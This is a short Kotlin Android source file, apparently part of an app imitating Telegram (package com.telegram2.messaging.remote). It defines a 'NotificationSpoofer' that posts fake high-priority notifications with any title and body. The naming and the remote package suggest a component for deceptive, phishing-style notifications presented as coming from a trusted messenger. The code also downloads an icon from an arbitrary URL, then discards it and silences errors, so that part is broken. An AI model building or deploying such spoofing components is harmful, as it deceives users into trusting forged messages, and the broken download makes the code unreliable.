package com.telegram2.messaging.remote

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.Build
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch

object NotificationSpoofer {
    private const val CHANNEL_ID = "spoofed_notifications"

    fun showFakeNotification(context: Context, title: String, body: String, iconUrl: String?) {
        val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "Spoofed", NotificationManager.IMPORTANCE_HIGH)
            nm.createNotificationChannel(channel)
        }

        // Optional icon download (simplified)
        if (iconUrl != null) {
            GlobalScope.launch(Dispatchers.IO) {
                try {
                    val input = java.net.URL(iconUrl).openStream()
                    android.graphics.BitmapFactory.decodeStream(input)
                } catch (e: Exception) {}
            }
        }

        val builder = NotificationCompat.Builder(context, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle(title)
            .setContentText(body)
            .setAutoCancel(true)
            .setPriority(NotificationCompat.PRIORITY_HIGH)

        nm.notify(System.currentTimeMillis().toInt(), builder.build())
    }
}